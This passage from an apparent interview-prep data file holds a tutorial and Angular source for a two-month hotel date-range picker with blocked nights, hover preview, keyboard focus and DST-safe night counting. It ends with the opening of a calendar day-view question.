**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. The "Verified" output was printed by this Angular 22.2.3 solution in jsdom, compiled AOT with strict templates and again with runtime JIT (the playground mode), with \`TZ=America/New_York\` so a daylight saving change sits inside the test stay.

## 1. Why This Even Matters — A Story First

A receptionist runs a finger along the calendar while you decide when to leave, and stops it at the first night that is already sold. That finger is the hover preview, the stop is the blocked-night cap, and "six nights" is the night count. Everything else, ISO-string dates, UTC arithmetic, the grid and the roving tabindex, comes from [Build a Calendar / Date Picker](/interview-question/build-a-calendar-date-picker).

## 2. Requirements and the Signal Model

Two months side by side, check-in then check-out, preview on hover and on keyboard focus, booked nights that a stay can never include, a live status line, and \`rangeChange\` emitted with \`[start, end]\` once complete.

| Piece | Angular tool | Notes |
| :--- | :--- | :--- |
| \`min\`, \`max\`, \`blocked\`, \`initialMonth\` | \`@Input()\` | \`initialMonth\` is \`{ required: true }\`. |
| \`range\`, \`hover\`, \`focused\`, \`view\` | \`signal()\` | All view-changing state is a signal (zoneless rendering). |
| \`choosingEnd\`, \`maxEnd\`, \`previewEnd\`, \`months\`, \`status\` | \`computed()\` | Derived rules and grids. |
| Output | \`@Output() rangeChange = new EventEmitter<[string, string]>()\` | Only for a complete stay. |
| Focus after render | \`afterNextRender\` | Same as the single picker. |

📌 **Interview term: Input timing** — \`@Input\` values are not set yet in the constructor. Signals that start from an input are filled in \`ngOnInit\`, the first hook that runs after inputs are bound ([lifecycle hooks](/interview-question/what-are-angular-lifecycle-hooks)):

\`\`\`ts
ngOnInit() {
  this.focused.set(this.initialMonth);
  this.view.set(this.initialMonth.slice(0, 7) + "-01");
}
\`\`\`

## 3. Build It Step by Step

### 3.1 A pure, typed \`pick\`

\`\`\`ts
export type Range = { start: string | null; end: string | null };
export function pick(
  { start, end }: Range,
  iso: string,
  ctx: {
    isBlocked: (iso: string) => boolean;
    maxEnd: string | null | undefined;
  },
): Range {
  if (ctx.isBlocked(iso)) return { start, end };
  // begin a new range
  if (!start || end || iso < start) return { start: iso, end: null };
  if (iso === start) return { start, end }; // need at least one night
  // would span a blocked date
  if (ctx.maxEnd && iso > ctx.maxEnd) return { start, end };
  return { start, end: iso };
}
\`\`\`

📌 **Interview term: State machine** — no start, choosing end, complete; every click and Enter is a transition decided in one function that you can unit-test without TestBed.

Strict TypeScript earned its keep here: the first \`maxEndFor\` returned \`max && cap > max ? max : cap\`, and \`ngc\` rejected it with \`TS18048: 'cap' is possibly 'undefined'\` (no \`max\` and no booked night after check-in). The fix, \`max && cap && cap > max\`, went into the shared JavaScript too.

### 3.2 Computed rules

\`\`\`ts
choosingEnd = computed(() => !!this.range().start && !this.range().end);
maxEnd = computed(() =>
  this.choosingEnd()
    ? (maxEndFor(this.range().start!, this.blocked, this.max) ?? null)
    : null,
);
previewEnd = computed(() => {
  const h = this.hover(),
    s = this.range().start,
    cap = this.maxEnd();
  return this.choosingEnd() && h && s && h > s
    ? cap && h > cap
      ? cap
      : h
    : null;
});
\`\`\`

📌 **Interview term: Derived UI state** — \`stateOf(iso)\` returns \`"start"\`, \`"end"\`, \`"range"\`, \`"preview"\` or \`""\` from these signals. Cells never store their own flags, so a hover changes one signal and Angular re-renders what read it ([signals vs RxJS](/interview-question/signals-signal-computed-effect-vs-rxjs-when-do-you-use-which-in-angular-18)).

### 3.3 Template: padding cells and attribute bindings

\`\`\`html
@for (iso of row; track $index) {
  @if (iso) {
    <td [attr.data-date]="iso" [attr.data-state]="stateOf(iso) || null"
      [class]="'day ' + stateOf(iso) + (unavailable(iso) ? ' off' : '')"
      [attr.tabindex]="iso === visibleFocus() ? 0 : -1"
      [attr.aria-selected]="isSelected(iso)" [attr.aria-disabled]="unavailable(iso) || null"
      (click)="focused.set(iso); choose(iso)">{{ +iso.slice(8) }}</td>
  } @else {
    <td role="presentation"></td>
  }
}
\`\`\`

Tracking by \`$index\` fits a positional grid, and \`@if\` / \`@else\` replaces a separate template for the blank cells ([control flow](/interview-question/how-does-the-new-control-flow-if-for-switch-replace-ngif-and-ngfor)).

### 3.4 Where the listeners live

Keyboard handling sits on the host with \`@HostListener("keydown", ["$event"])\`, because keydown bubbles from any focused cell to the component element. Mouse handling is in the template, on the \`.rp\` wrapper:

\`\`\`html
<div
  class="rp"
  (mouseover)="onOver($event)"
  (mouseleave)="hover.set(null)"
></div>
\`\`\`

The first draft also used \`@HostListener("mouseleave")\`. In the playground run, the preview did not clear: the driver dispatched \`mouseleave\` on the \`.rp\` wrapper, and \`mouseleave\` does not bubble, so a listener on the host element never saw it. Putting both mouse listeners on the same element made them symmetric, and the output then matched React and Vue.

📌 **Interview term: Non-bubbling events** — \`mouseenter\`, \`mouseleave\`, \`focus\` and \`blur\` fire only on the element itself. \`mouseover\` and \`focusin\` bubble, which is why \`mouseover\` works for [event delegation](/interview-question/explain-event-delegation) across 84 cells.

### 3.5 Focus across two months

\`moveFocus\` scrolls \`view\` when focus leaves the two visible months, sets \`focused\` and \`hover\` (so keyboard users see the same preview), then focuses \`[tabindex="0"]\` in \`afterNextRender\`. \`visibleFocus\` is a computed that falls back to the first in-range day of the left month when the nav buttons scroll the focused day away.

📌 **Interview term: Roving tabindex across grids** — one tabbable day for both month tables, so Tab enters the calendar once.

### 3.6 Nights in UTC

\`diffDays\` subtracts UTC midnights. Local midnights on 7 and 9 March 2026 in New York are 47 hours apart (a Node check printed \`1.9583333333333333\` days), so flooring a local difference would charge one night for a two-night stay.

## 4. Verified

Angular 22.2.3, jsdom, \`TZ=America/New_York\`, booked nights 12, 13 and 27 March 2026, \`min="2026-03-02"\`. AOT and JIT both printed these lines, identical to React and Vue (and identical again with \`TZ=Asia/Kolkata\`):

\`\`\`text
TZ=America/New_York months: March 2026 | April 2026 | prev disabled: true
status: Select a check-in date.
click booked Mar 12 -> Select a check-in date.
click Mar 5 -> Check-in Thu, Mar 5. Select a check-out date (latest Wed, Mar 11).
hover Mar 9 -> preview: 03-06 03-07 03-08 03-09
hover Mar 20 -> preview: 03-06 03-07 03-08 03-09 03-10 03-11 | Mar 14 aria-disabled: true
mouse leaves -> preview: (none)
click Mar 3 (before start) -> Check-in Tue, Mar 3. Select a check-out date (latest Wed, Mar 11).
click Mar 9 -> Tue, Mar 3 to Mon, Mar 9, 6 nights. | range: 03-04 03-05 03-06 03-07 03-08 | onChange: 2026-03-03 to 2026-03-09
aria-selected cells: 03-03 03-04 03-05 03-06 03-07 03-08 03-09
Enter on 2026-03-09 -> Check-in Mon, Mar 9. Select a check-out date (latest Wed, Mar 11).
Right x3 -> focus 2026-03-12 | preview: 03-10 03-11
Enter on booked day -> Check-in Mon, Mar 9. Select a check-out date (latest Wed, Mar 11).
Escape -> Select a check-in date.
start Mar 28, Down -> focus 2026-04-04 | preview: 03-29 03-30 03-31 04-01 04-02 04-03 04-04
Enter -> Sat, Mar 28 to Sat, Apr 4, 7 nights. | onChange: 2026-03-28 to 2026-04-04
PageDown x2 -> focus 2026-06-04 | months: May 2026 | June 2026 | tabindex=0: 1
Prev x2 -> months: March 2026 | April 2026 | tabbable day: 2026-03-02
Clear -> Select a check-in date. | selected: 0
\`\`\`

The \`onChange:\` text is rendered by \`AppComponent\` from its \`stay\` signal, set by \`(rangeChange)\`. The preview stopped at 11 March, 3 to 9 March counted **6 nights** across the DST weekend, and focus followed PageDown into June. jsdom has no pointer, so the driver dispatched \`mouseover\` and \`mouseleave\` itself, and colours and layout were not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Blocked night inside a stay | Impossible: days after \`maxEnd\` are unavailable while choosing |
| Restart and minimum stay | \`pick\` |
| Input arriving late | Signals seeded in \`ngOnInit\` |
| Focus scrolled out of view | \`visibleFocus\` computed |
| Announcements | \`role="status"\` with \`aria-live="polite"\` |
| Semantics | \`aria-selected\` on the stay, \`aria-multiselectable\` on each grid, ", unavailable" in labels |

## 6. Common Pitfalls

- **Reading \`@Input\` values in field initialisers or the constructor.** They are still defaults; seed signals in \`ngOnInit\`.
- **\`@HostListener("mouseleave")\` when the hover lives on an inner element.** Non-bubbling events must be caught where they fire.
- **Plain fields for state.** Template events mark the view dirty, but a write from a timer or a promise does not render in a zoneless app; signals make every path render.
- **\`cap > max\` with possibly undefined values.** Strict templates and strict TypeScript catch it; keep both on.
- **Counting nights with local \`Date\` subtraction.** Wrong across DST.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Inputs:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">min</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">max</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">blocked</code> and a required <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">initialMonth</code> as <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@Input</code>, signals seeded in <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">ngOnInit</code>, and a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">rangeChange</code> output."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Machine:</strong> <span style="color:#f0e2c8;">"A pure typed <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">pick</code> decides new range, restart, one-night minimum and the blocked cap; <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">range</code> is a single signal."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Computed:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEnd</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">previewEnd</code>, the two month grids and the status text are <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code>, and each cell derives its state."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Events:</strong> <span style="color:#f0e2c8;">"Keydown on the host, delegated <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mouseover</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mouseleave</code> on the wrapper, keyboard moves also set <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">hover</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Focus:</strong> <span style="color:#f0e2c8;">"A roving <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code> across both grids, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">afterNextRender</code> focus, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-selected</code> on the stay and a live status line."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you plug it into a reactive form?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Implement <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">ControlValueAccessor</code> and call <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">onChange([start, end])</code> when a range completes; <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">writeValue</code> sets <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">range</code>. A validator can then require a complete range.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Booked dates come from an API. What changes?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Make <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">blocked</code> a signal fed by <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toSignal</code> of the request, or use an input that the parent fills. <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEnd</code> is computed, so the cap updates by itself; block picking while loading.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">effect</code> to sync <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">hover</code> from <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">focused</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">They change together in one handler, so setting both there is simpler and avoids an effect writing signals, which Angular discourages for derived state.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Unit-test <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">pick</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEndFor</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">diffDays</code> as plain functions under several <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">TZ</code> values, then a TestBed test dispatching <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mouseover</code> and keydown and asserting <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">data-state</code> and the status text.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Input timing** | Inputs are bound before \`ngOnInit\`, not in the constructor |
| **State machine** | Named states plus explicit transitions |
| **Derived UI state** | Cell flags computed from signals |
| **Non-bubbling events** | Events such as \`mouseleave\` that fire only on their own element |
| **Roving tabindex across grids** | One tabbable day for both months |

---
**Conclusion:** The Angular range picker is a typed state machine (\`pick\`), a handful of \`computed\` signals for the cap, preview and grids, and carefully placed listeners: keydown on the host, mouse events where they actually fire. Strict compilation caught a possibly-undefined comparison, the playground run caught a non-bubbling \`mouseleave\`, and the verified output shows the cap, a cross-month stay and six correct nights across the DST weekend in both compilation modes.`,
        files: {
          "/src/app/app.component.ts": `import { Component, signal } from "@angular/core";
import { RangePickerComponent } from "./range-picker.component";

@Component({
  selector: "app-root",
  standalone: true,
  imports: [RangePickerComponent],
  styles: [
    \`
    :host { display: block; min-height: 100vh; margin: 0; background: #0f1115; color: #e6e6e6; font-family: system-ui, sans-serif; }
    .page { max-width: 720px; margin: 0 auto; padding: 24px 16px; }
    :host ::ng-deep .rp { position: relative; background: #171a21; border: 1px solid #2c3340; border-radius: 12px; padding: 12px; }
    :host ::ng-deep .rp-nav { position: absolute; top: 10px; left: 8px; right: 8px; display: flex; justify-content: space-between; pointer-events: none; }
    :host ::ng-deep .rp-nav button { pointer-events: auto; background: none; border: 0; color: #c9d1d9; font-size: 20px; width: 32px; height: 32px; border-radius: 6px; cursor: pointer; }
    :host ::ng-deep .rp-nav button:disabled { opacity: .3; }
    :host ::ng-deep .rp-months { display: flex; flex-wrap: wrap; gap: 16px; }
    :host ::ng-deep .rp-month { flex: 1 1 260px; }
    :host ::ng-deep .rp-month h3 { text-align: center; font-size: 15px; margin: 6px 0 10px; }
    :host ::ng-deep table { width: 100%; border-collapse: collapse; }
    :host ::ng-deep th { font-size: 12px; color: #8b949e; font-weight: 500; padding: 4px 0; }
    :host ::ng-deep td.day { text-align: center; padding: 8px 0; font-size: 14px; cursor: pointer; }
    :host ::ng-deep td.day:focus { outline: 2px solid #f9a825; outline-offset: -2px; }
    :host ::ng-deep td.range { background: #3d2810; }
    :host ::ng-deep td.preview { background: #2a2214; box-shadow: inset 0 0 0 1px #6b5320; }
    :host ::ng-deep td.start, :host ::ng-deep td.end { background: #f9a825; color: #1c140a; font-weight: 700; }
    :host ::ng-deep td.start { border-radius: 8px 0 0 8px; } :host ::ng-deep td.end { border-radius: 0 8px 8px 0; }
    :host ::ng-deep td.off { color: #474e5a; text-decoration: line-through; cursor: not-allowed; }
    :host ::ng-deep .rp-foot { display: flex; align-items: center; justify-content: space-between; gap: 12px; border-top: 1px solid #2c3340; margin-top: 8px; padding-top: 8px; }
    :host ::ng-deep .rp-foot p { margin: 0; font-size: 14px; color: #c9d1d9; }
    :host ::ng-deep .rp-foot button { background: #222834; color: #e6e6e6; border: 1px solid #2c3340; border-radius: 8px; padding: 6px 12px; cursor: pointer; }
    .out { color: #9aa4b2; font-size: 14px; }
  \`,
  ],
  template: \`
    <main class="page">
      <h1 style="font-size: 18px">Book your stay</h1>
      <app-range-picker
        initialMonth="2026-03-05"
        min="2026-03-02"
        max="2026-12-31"
        [blocked]="booked"
        (rangeChange)="stay.set($event)"
      />
      <p
        class="out"
        data-testid="out"
      >onChange: {{ stay() ? stay()!.join(" to ") : "nothing yet" }}</p>
    </main>
  \`,
})
export class AppComponent {
  readonly booked = ["2026-03-12", "2026-03-13", "2026-03-27"];
  stay = signal<[string, string] | null>(null);
}
`,
          "/src/app/dates.ts": `// Calendar dates are ISO strings "YYYY-MM-DD": they compare with < and >,
// work as keys, and carry no time zone. Arithmetic goes through Date.UTC,
// which has no daylight-saving gaps.
export const MONTHS = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
];
export const DAYS = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

const pad = (n: number) => String(n).padStart(2, "0");
const utc = (iso: string) =>
  Date.UTC(+iso.slice(0, 4), +iso.slice(5, 7) - 1, +iso.slice(8, 10));
const fromUtc = (ms: number) => {
  const t = new Date(ms);
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
};
export const toISO = (y: number, m: number, d: number) =>
  fromUtc(Date.UTC(y, m, d));
export const addDays = (iso: string, n: number): string =>
  fromUtc(utc(iso) + n * 86400000); // exact: UTC days are always 24h
export const diffDays = (a: string, b: string) =>
  Math.round((utc(b) - utc(a)) / 86400000);
export const weekday = (iso: string) => new Date(utc(iso)).getUTCDay();
export const monthOf = (iso: string) => ({
  y: +iso.slice(0, 4),
  m: +iso.slice(5, 7) - 1,
});
export const addMonths = (iso: string, n: number) => {
  const { y, m } = monthOf(iso);
  const last = new Date(Date.UTC(y, m + n + 1, 0)).getUTCDate();
  return toISO(y, m + n, Math.min(+iso.slice(8, 10), last));
};
export const shortLabel = (iso: string) =>
  DAYS[weekday(iso)] +
  ", " +
  MONTHS[+iso.slice(5, 7) - 1].slice(0, 3) +
  " " +
  +iso.slice(8, 10);
// 42 cells; days outside the month are null (a two-month view hides them).
export function monthCells(y: number, m: number): (string | null)[] {
  const first = toISO(y, m, 1);
  const lead = weekday(first);
  const len = new Date(Date.UTC(y, m + 1, 0)).getUTCDate();
  return Array.from({ length: 42 }, (_, i) =>
    i < lead || i >= lead + len ? null : addDays(first, i - lead),
  );
}

// Range rules shared by every framework version.
// The furthest check-out allowed: the night
// before the first blocked date after start.
export function maxEndFor(
  start: string,
  blocked: string[],
  max?: string,
): string | undefined {
  const next = blocked.filter((b) => b > start).sort()[0];
  const cap = next ? addDays(next, -1) : max;
  return max && cap && cap > max ? max : cap;
}
// What a click (or Enter) on \`iso\` does to the current selection.
export type Range = { start: string | null; end: string | null };
export function pick(
  { start, end }: Range,
  iso: string,
  ctx: {
    isBlocked: (iso: string) => boolean;
    maxEnd: string | null | undefined;
  },
): Range {
  if (ctx.isBlocked(iso)) return { start, end };
  // begin a new range
  if (!start || end || iso < start) return { start: iso, end: null };
  if (iso === start) return { start, end }; // need at least one night
  // would span a blocked date
  if (ctx.maxEnd && iso > ctx.maxEnd) return { start, end };
  return { start, end: iso };
}
`,
          "/src/app/range-picker.component.ts": `import {
  Component,
  ElementRef,
  EventEmitter,
  HostListener,
  Injector,
  Input,
  OnInit,
  Output,
  afterNextRender,
  computed,
  inject,
  signal,
} from "@angular/core";
import {
  DAYS,
  MONTHS,
  Range,
  addDays,
  addMonths,
  diffDays,
  maxEndFor,
  monthCells,
  monthOf,
  pick,
  shortLabel,
  toISO,
  weekday,
} from "./dates";

@Component({
  selector: "app-range-picker",
  standalone: true,
  template: \`
    <div class="rp" (mouseover)="onOver($event)" (mouseleave)="hover.set(null)">
      <div class="rp-nav">
        <button
          type="button"
          aria-label="Previous month"
          [disabled]="!canPrev()"
          (click)="view.set(addMonths(view(), -1))"
        >&lsaquo;</button>
        <button
          type="button"
          aria-label="Next month"
          [disabled]="!canNext()"
          (click)="view.set(addMonths(view(), 1))"
        >&rsaquo;</button>
      </div>
      <div class="rp-months">
        @for (mo of months(); track mo.id) {
          <section class="rp-month">
            <h3 [id]="mo.id">{{ monthNames[mo.m] }} {{ mo.y }}</h3>
            <table
              role="grid"
              [attr.aria-labelledby]="mo.id"
              aria-multiselectable="true"
            >
              <thead><tr>@for (d of days; track d) { <th scope="col" [attr.abbr]="d">{{ d.slice(0, 2) }}</th> }</tr></thead>
              <tbody>
                @for (row of mo.rows; track $index) {
                  <tr>
                    @for (iso of row; track $index) {
                      @if (iso) {
                        <td [attr.data-date]="iso" [attr.data-state]="stateOf(iso) || null"
                          [class]="'day ' + stateOf(iso) + (unavailable(iso) ? ' off' : '')"
                          [attr.tabindex]="iso === visibleFocus() ? 0 : -1"
                          [attr.aria-label]="shortLabel(iso) + (blocked.includes(iso) ? ', unavailable' : '')"
                          [attr.aria-selected]="isSelected(iso)" [attr.aria-disabled]="unavailable(iso) || null"
                          (click)="focused.set(iso); choose(iso)">{{ +iso.slice(8) }}</td>
                      } @else {
                        <td role="presentation"></td>
                      }
                    }
                  </tr>
                }
              </tbody>
            </table>
          </section>
        }
      </div>
      <div class="rp-foot">
        <p
          role="status"
          aria-live="polite"
          data-testid="status"
        >{{ status() }}</p>
        <button
          type="button"
          [disabled]="!range().start"
          (click)="clear()"
        >Clear</button>
      </div>
    </div>
  \`,
})
export class RangePickerComponent implements OnInit {
  @Input() min?: string;
  @Input() max?: string;
  @Input() blocked: string[] = [];
  @Input({ required: true }) initialMonth!: string;
  @Output() rangeChange = new EventEmitter<[string, string]>();

  private host = inject(ElementRef);
  private injector = inject(Injector);
  readonly days = DAYS;
  readonly monthNames = MONTHS;
  readonly shortLabel = shortLabel;
  readonly addMonths = addMonths;

  range = signal<Range>({ start: null, end: null });
  hover = signal<string | null>(null); // preview end while choosing check-out
  focused = signal(""); // roving tabindex target
  view = signal(""); // first day of the left month

  ngOnInit() {
    // @Input values are set by now, not yet in the constructor
    this.focused.set(this.initialMonth);
    this.view.set(this.initialMonth.slice(0, 7) + "-01");
  }

  choosingEnd = computed(() => !!this.range().start && !this.range().end);
  maxEnd = computed(() =>
    this.choosingEnd()
      ? (maxEndFor(this.range().start!, this.blocked, this.max) ?? null)
      : null,
  );
  previewEnd = computed(() => {
    const h = this.hover(),
      s = this.range().start,
      cap = this.maxEnd();
    return this.choosingEnd() && h && s && h > s
      ? cap && h > cap
        ? cap
        : h
      : null;
  });
  months = computed(() =>
    [this.view(), addMonths(this.view(), 1)].map((iso) => {
      const { y, m } = monthOf(iso);
      const cells = monthCells(y, m);
      return {
        y,
        m,
        id: \`rp-\${y}-\${m}\`,
        rows: [0, 1, 2, 3, 4, 5].map((r) => cells.slice(r * 7, r * 7 + 7)),
      };
    }),
  );
  // Focus may sit in a month that scrolled out
  // of view; keep one visible day tabbable.
  visibleFocus = computed(() => {
    const v = this.view(),
      shown = [v.slice(0, 7), addMonths(v, 1).slice(0, 7)];
    if (shown.includes(this.focused().slice(0, 7))) return this.focused();
    return this.min && v < this.min ? this.min : v;
  });
  status = computed(() => {
    const { start, end } = this.range();
    if (!start) return "Select a check-in date.";
    const cap = this.maxEnd();
    if (!end)
      return \`Check-in \${shortLabel(start)}. Select a check-out date\${cap ? \` (latest \${shortLabel(cap)})\` : ""}.\`;
    const n = diffDays(start, end);
    return \`\${shortLabel(start)} to \${shortLabel(end)}, \${n} night\${n === 1 ? "" : "s"}.\`;
  });
  canPrev = computed(() => {
    const mo = this.months()[0];
    return !this.min || toISO(mo.y, mo.m, 0) >= this.min;
  });
  canNext = computed(() => {
    const mo = this.months()[1];
    return !this.max || toISO(mo.y, mo.m + 1, 1) <= this.max;
  });

  isBlocked = (iso: string) =>
    !!(
      this.blocked.includes(iso) ||
      (this.min && iso < this.min) ||
      (this.max && iso > this.max)
    );
  unavailable = (iso: string) =>
    this.isBlocked(iso) || (this.choosingEnd() && iso > this.maxEnd()!);
  stateOf(iso: string) {
    const { start, end } = this.range(),
      p = this.previewEnd();
    if (iso === start) return "start";
    if (iso === end) return "end";
    if (start && end && iso > start && iso < end) return "range";
    if (start && p && iso > start && iso <= p) return "preview";
    return "";
  }
  isSelected = (iso: string) =>
    ["start", "end", "range"].includes(this.stateOf(iso));

  choose(iso: string) {
    const cur = this.range();
    const next = pick(cur, iso, {
      isBlocked: this.isBlocked,
      maxEnd: this.maxEnd(),
    });
    if (next.start === cur.start && next.end === cur.end) return;
    this.range.set(next);
    this.hover.set(null);
    if (next.start && next.end) this.rangeChange.emit([next.start, next.end]);
  }
  clear() {
    this.range.set({ start: null, end: null });
    this.hover.set(null);
  }

  private moveFocus(iso: string) {
    if ((this.min && iso < this.min) || (this.max && iso > this.max)) return;
    const v = this.view(),
      left = v.slice(0, 7),
      right = addMonths(v, 1).slice(0, 7);
    if (iso.slice(0, 7) < left) this.view.set(iso.slice(0, 7) + "-01");
    else if (iso.slice(0, 7) > right)
      this.view.set(addMonths(iso.slice(0, 7) + "-01", -1));
    this.focused.set(iso);
    this.hover.set(iso); // keyboard users get the same preview as mouse users
    afterNextRender(
      () => this.host.nativeElement.querySelector('[tabindex="0"]')?.focus(),
      { injector: this.injector },
    );
  }

  @HostListener("keydown", ["$event"])
  onKey(e: KeyboardEvent) {
    const f = this.focused(),
      dow = weekday(f);
    const moves: Record<string, number> = {
      ArrowLeft: -1,
      ArrowRight: 1,
      ArrowUp: -7,
      ArrowDown: 7,
      Home: -dow,
      End: 6 - dow,
    };
    if (e.key in moves) {
      e.preventDefault();
      this.moveFocus(addDays(f, moves[e.key]));
    } else if (e.key === "PageUp" || e.key === "PageDown") {
      e.preventDefault();
      this.moveFocus(addMonths(f, e.key === "PageUp" ? -1 : 1));
    } else if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      this.choose(f);
    } else if (e.key === "Escape" && this.choosingEnd()) {
      e.preventDefault();
      this.clear();
    }
  }
  onOver(e: MouseEvent) {
    const iso = (e.target as Element)
      .closest?.("[data-date]")
      ?.getAttribute("data-date");
    if (iso && iso !== this.hover()) this.hover.set(iso);
  }
}
`,
        },
      },
    },
  },
  // ══════════════════════════════════════════════════════════════════════════
  {
    title: "Build a Calendar Day View with overlapping events",
    seoDescription: "Build a calendar day view in React, Vue and Angular: lay out overlapping events side by side with clusters, greedy column packing and span expansion.",
    description: `**Question presented to candidate:**
"Show one day of a calendar, like Google Calendar's day view, from 8 am to 7 pm. Each event is a box whose top and height come from its start and end time. When events overlap they must sit side by side, never on top of each other, and they should use as much width as they can. Let me add and delete events and see the layout update."

**Requirements:**
- A vertical timeline with hour lines; each event positioned by time (\`top\`, \`height\`) and by column (\`left\`, \`width\`).
- Overlapping events never cover each other; an event that touches another (one ends at 10:30, the next starts at 10:30) does not count as overlapping.
- Events that do not overlap anything use the full width; within a group, an event expands right into free columns.
- Clicking an event shows its details with a Delete button; a small form adds an event and validates it (title, end after start, inside the visible hours).
- Events are keyboard reachable in time order and have readable labels such as "Interview, 11:00 to 12:00".

**What a strong answer should cover:**
- The layout as a pure function from events to \`{ col, cols, span }\`, kept out of the components and derived on every change.
- Sorting by start (longer first on ties), sweeping into clusters of transitively overlapping events, and greedy column assignment (first column whose last event has ended).
- Why every event in a cluster shares the cluster's column count, and how the right-expansion check works.
